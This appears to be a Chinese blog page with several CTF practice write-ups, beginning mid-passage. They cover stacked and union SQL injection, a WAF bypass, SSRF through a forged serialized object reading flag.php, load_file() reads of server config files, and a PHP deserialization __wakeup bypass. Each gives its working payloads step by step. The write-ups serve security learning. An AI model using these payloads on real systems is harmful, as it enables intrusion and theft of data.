</li></ol>

<h2>题目</h2>

<p>提交 1’ 报错确定存在sql注入<br>提交 1’# 返回正常<br>提交 1’select# 返回黑名单:<br><img src="/2021/02/12/list/q1.png"><br>禁用了select和where等关键字<br>采用堆叠注入<br>首先查询列数：</p>
<ul>
<li>1' order by 2#]
</li></ul>

<p>列数为2</p>
<p>union等关键词被过滤 正常注入无法进行<br>考虑堆叠注入——使用分号结束上一个语句再叠加其他语句一起执行；</p>
<ul>
<li>1' and 1=2;show databases#
</li><li>1' and 1=2;show tables#
</li></ul>

<p><img src="/2021/02/12/list/q2.png"><br>然后</p>
<ul>
<li>1' and 1=2;desc `FlagHere`#
</li></ul>

<p><img src="/2021/02/12/list/q3.png"><br>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭<br>payload如下：</p>
<ul>
<li>1';
HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#
</li></ul>

<p><img src="/2021/02/12/list/q4.png"><br>得到flag~~</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-baby-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/02/10/baby-1/" class="article-date">
  	<time datetime="2021-02-10T12:19:54.000Z" itemprop="datePublished">2021-02-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/10/baby-1/">
        22-buu练习[GXYCTF2019]BabySQli
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2>知识点</h2>

<ul>
<li>1、联合查询
</li><li>2、base32+base64
</li><li>3、通过联合注入向数据库中写数据
</li></ul>

<p><b style="color:pink">知识点详解：</b><br><b style="color:purple">1、利用联合注入向数据库里写东西的原因</b><br>答：在使用联合注入时，如果你查询的数据不存在，那么就会生成一个内容为null的虚拟数据，所以这是我们就可以在注入时添加我们需要的信息来完成我们的目的。<br><b style="color:purple">2、 base32和base64的区别</b><br>答：base32是全部由大写字母和数字构成，或者其结尾有三个等号<br>base64则是由大小写字母和数字一起构成。<br><b style="color:purple">3、联合查询</b><br>概述：<br>　　联合查询效率较高，举例子来说明联合查询：内联inner join 、左联left outer join 、右联right outer join 、全联full outer join 的好处及用法。<br>联合查询效率较高，以下例子来说明联合查询(内联、左联、右联、全联)的好处：<br><img src="/2021/02/10/baby-1/c1.png"><br><b style="color:blue">第一：内联(inner join)。</b><br>　　如果想把用户信息、积分、等级都列出来，那么一般会这样写：select * from T1 ,T3 where T1.userid = T3.userid(其实这样的结果等同于select * from T1 inner join T3 on T1.userid=T3.userid )。<br>　　把两个表中都存在userid的行拼成一行(即内联)，但后者的效率会比前者高很多，建议用后者(内联)的写法。<br>　　SQL语句：select * from T1 inner join T2 on T1.userid=T2.userid<br><img src="/2021/02/10/baby-1/c2.png"><br><b style="color:blue">第二：左联(left outer join)。</b><br>　　显示左表T1中的所有行，并把右表T2中符合条件加到左表T1中;右表T2中不符合条件，就不用加入结果表中，并且NULL表示。<br>　　SQL语句：select * from T1 left outer join T2 on T1.userid=T2.userid<br><img src="/2021/02/10/baby-1/a1.png"><br><b style="color:blue">第三：右联(right outer join)。</b><br>　　显示右表T2中的所有行，并把左表T1中符合条件加到右表T2中;左表T1中不符合条件，就不用加入结果表中，并且NULL表示。<br>　　SQL语句：select * from T1 right outer join T2 on T1.userid=T2.userid<br><img src="/2021/02/10/baby-1/a1.png"><br><b style="color:blue">第四：全联(full outer join)。</b><br>　　显示左表T1、右表T2两边中的所有行，即把左联结果表+右联结果表组合在一起，然后过滤掉重复的。<br>　　SQL语句：select * from T1 full outer join T2 on T1.userid=T2.userid<br><img src="/2021/02/10/baby-1/a3.png"><br>　　总结，关于联合查询，效率的确比较高，4种联合方式如果可以灵活使用，基本上复杂的语句结构也会简单起来。这4种方式是：1)Inner join 2)left outer join 3)right outer join 4)full outer join</p>
<h2>题目：</h2>

<p>打开靶场，又是一个登录界面emmm慌了<br><img src="/2021/02/10/baby-1/b1.png"><br>经过激烈心理斗争后，还是做叭=^=|||<br>试试万能密码，euuu半天没结果，决定盲猜用户名，经过几个月的经验，大概率是admin<br><img src="/2021/02/10/baby-1/b2.png"><br>果然，只是密码不对,用其他的用户名会出现wrong user 的界面，所以用户名是正确滴，那么尝试在用户名处添加一个’通过其回显<br><img src="/2021/02/10/baby-1/b4.png"><br>显示如下界面：<br><img src="/2021/02/10/baby-1/%E6%8A%8A.png"><br>可以得到用户名那里存在注入点<br>查看源码，如下：<br><img src="/2021/02/10/baby-1/b5.png"><br>这个编码成功引起我的注意，判断应该是base32编码（具体原因前面有介绍）<br><img src="/2021/02/10/baby-1/b6.png"><br>解密后出现base64编码：c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==<br>再次解密：<br><img src="/2021/02/10/baby-1/b7.png"><br>得到查询规则：select * from user where username = ‘$name’<br>接下来就很简单了，在用户名处，通过联合注入，写入我们想要的信息，我写的是1234按照我们的输入，sqli在数据库中写入数据，相当于伪造了一个身份，就可以用这个身份登录了<br>burp抓包发现是POST，利用sqli的特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。<br>那就post传参构造payload：<b style="color:red">name=1’ union select 0,’admin’,’81dc9bdb52d04dc20036dbd8313ed055’%23&amp;pw=1234</b><br>执行联合查询，其中81dc9bdb52d04dc20036dbd8313ed055是1234对应的MD5加密的值<br><img src="/2021/02/10/baby-1/b8.png"><br>呕吼<del>成功得到flag</del>！</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-ssrf" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/02/08/ssrf/" class="article-date">
  	<time datetime="2021-02-08T13:16:37.000Z" itemprop="datePublished">2021-02-08</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/08/ssrf/">
        21-buu练习[网鼎杯 2018]Fakebook（ssrf漏洞）
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2>知识点：ssrf</h2>

<p>SSRF,也就是Server Side RequestForgery—服务器端请求伪造。从字面上来看，与CSRF不同的是，它是服务器端发出的请求伪造而非从用户一端提交。别误会，作为受信任用户，服务器当然不可能做出损害用户信息的事。它是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。因为它是由服务端发起的，所以它能够请求到与它相连但与外网隔离的内部系统。<br>一般由curl的滥用引起。</p>
<h2>题目：</h2>
<h3>##1信息搜集</h3>

<p>通过dirsearch扫描到robots.txt,访问robots.txt，如下<br><img src="/2021/02/08/ssrf/s1.png"><br>发现存在/user.php.bak,下载下来打开如下图:<br><img src="/2021/02/08/ssrf/s2.png"><br>经过分析可得：</p>
<ul>
<li>1，注册界面输入的blog经过了isValidBlog（）函数的过滤，不然直接在注册界面输入file:///var/www/html/flag.php就能拿到flag。
</li><li>2，get()函数存在ssrf漏洞。
</li></ul>
<h3>##2注册一个账号测试</h3>

<p><img src="/2021/02/08/ssrf/s3.png"><br>注意blog是一个http或https的链接的形式，否则将无法通过<br>点击用户名进入用户界面:<br><img src="/2021/02/08/ssrf/s4.png"><br>打开后发现url里面有参数no，尝试注入：</p>
<ul>
<li>view.php?no=1 order by 4--+//正常
</li><li>view.php?no=1 order by 5--+//报错
</li></ul>

<p><img src="/2021/02/08/ssrf/s5.png"><br>order by 5时报错，可以判断字段数为4。<br>输入union select 1,2,3,4:</p>
<ul>
<li>view.php?no=1 union select 1,2,3,4--+
</li></ul>

<p><img src="/2021/02/08/ssrf/s6.png"><br>提示no hack<br>于是尝试绕过waf，改为union/**/select：</p>
<ul>
<li>view.php?no=1 union/**/select 1,2,3,4--+
</li></ul>

<p><img src="/2021/02/08/ssrf/s9.png"><br>成功绕过，发现注入点为2<br>爆数据库：<ul></ul></p>
<li>/view.php?no=0 union/**/select 1,database(),3,4--+


<p><img src="/2021/02/08/ssrf/s7.png"><br>数据库为：fakebook<br>爆表：<ul></ul></p>
</li><li>/view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'--+


<p><img src="/2021/02/08/ssrf/s8.png"><br>表为：users。<br>得列名：<ul></ul></p>
</li><li>/view.php?no=0%20union/**/select%201,group_concat(column_name),3,4 from information_schema.columns where table_schema='fakebook' and table_name='users'--+


<p><img src="/2021/02/08/ssrf/s10.png"><br>列名为：no,username,passwd,data<br>查出数据：/view.php?no=0%20union/**/select%201,group_concat(no,’-‘,username,’-‘,passwd,’-‘,data),3,4 from fakebook.users –+<br><img src="/2021/02/08/ssrf/s11.png"><br>数据如下：<br>1-admin-c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec-O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:19;s:4:”blog”;s:67:”<a target="_blank" rel="noopener" href="http://2f653644-f372-48c1-a0f9-7938cd6adf27.node3.buuoj.cn/join.php&quot;;%7D">http://2f653644-f372-48c1-a0f9-7938cd6adf27.node3.buuoj.cn/join.php&quot;;}</a></p>
<h3>##3利用ssrf漏洞</h3>
<ul>
<li>/view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
</li></ul>

<p>查看源码：<br><img src="/2021/02/08/ssrf/s12.png"><br>打开网址，得到flag！</p>
<h3>##4非预期解</h3>


<p>因为没有禁用load_file()函数，所以可以直接利用该函数拿到flag。哈哈，看到这个非预期解还是有点懵的，绕了半天结果简单一步就出来了<br>payload：<br>/view.php?no=0 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4<br><img src="/2021/02/08/ssrf/s13.png"><br>直接得到flag！</p>
<h4>非预期解的深入探索</h4>

<p>一，受到参数 secure_file_priv 的影响<br>查了查资料，因为涉及到在服务器上写入文件，所以上述函数能否成功执行受到参数 secure_file_priv 的影响二，利用条件<br>而且想要利用是有条件限制的：<br>1、必须有权限读取并且文件必须完全可读。<br>2、欲读取文件必须在服务器上<br>3、必须指定文件完整的路径<br>4、欲读取文件必须小于max_allowed_packet<br>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限。<br>在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到administrators才能访问的文件，<br>users就不能实现用load_file读取文件了。<br>三，利用技巧<br>1，绕过引号，因为现在magic_quotes_gpc=off的主机少之又少，怎么才能构造处没有引号的语句呢？<br>load_file(‘c:/boot.ini’) ==&gt; load_file(char(99,58,47,98,111,111,116,46,105,110,105))<br>2，load_file()还有一些常用的读取敏感信息方法，例如：<br>——————<br>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</p>
<p>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf  查看WINDOWS系统apache文件</p>
<p>c:/Resin-3.0.14/conf/resin.conf   查看jsp开发的网站 resin文件配置信息.</p>
</li>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-zip" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/02/07/zip/" class="article-date">
  	<time datetime="2021-02-07T05:49:18.000Z" itemprop="datePublished">2021-02-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/07/zip/">
        20-buu练习[极客大挑战 2019]PHP1
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2>知识点</h2>

<p><b style="color:pink">1：用dirsearch扫描备份文件</b><br>安装及使用教程参见：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43459870/article/details/102521386">https://blog.csdn.net/weixin_43459870/article/details/102521386</a><br><b style="color:pink">2：public、protected与private在序列化时的区别</b></p>
<ul>
<li>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。
</li><li>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。
</li></ul>


<p><b style="color:pink">3：__wakeup()方法绕过</b><br>一个经常被用来出题的函数<br>(CVE-2016-7124)<br>作用：与__sleep()函数相反，__sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。绕过：当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。</p>
<h2>题目</h2>

<p>打开靶场，界面如下：<br><img src="/2021/02/07/zip/zip0.png"><br>根据提示，可知他有一个备份网站的习惯，那我们用dirsearch扫描目录：<br>命令：python dirsearch.py -u URL -e extension<br><img src="/2021/02/07/zip/zip3.png"><br>扫描到一个<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 文件，我们直接在url上输入<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> ，下载该zip文件<br><img src="/2021/02/07/zip/zip2.png"><br><img src="/2021/02/07/zip/zip1.png"><br>index.php包含如下代码:接收参数，进行序列化<br><img src="/2021/02/07/zip/zip4.png"><br>class.php文件源码入下：<br><img src="/2021/02/07/zip/zip5.png"><br>flag.php包含如下代码:<br><img src="/2021/02/07/zip/zip6.png"><br><b>声明一个Name类，包含username,password,且两个变量都是private修饰,整句话都有用。<br>然后根据判断句得知，username必须是admin,password必须是100所以，构造序列化</b></p>
<ul>
<li>O是对象，s是字符串，i是数字
</li><li>因为是private修饰的所以要加%00充当空格
</li><li>构造:O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
</li><li>payload：url+?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
</li></ul>

<p><img src="/2021/02/07/zip/zip7.png"><br>得到flag！</p>
<h2>菜鸡求学之路</h2> 

<p>看大佬的payload的时候，很疑惑为什么要写%00Name%00username这样的形式？<br>进行了三种修饰方式的测试:public,protected,private<br>只有public修饰的不用太多的修饰原生态构造就好，而private需要加%00Name%00，<br>protected则需要使用 %00*%00username这样的方式<br>——————<br><b>protected修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip8.png"><br><b>public修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip9.png"><br><b>private修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip10.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2021 Jialu
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>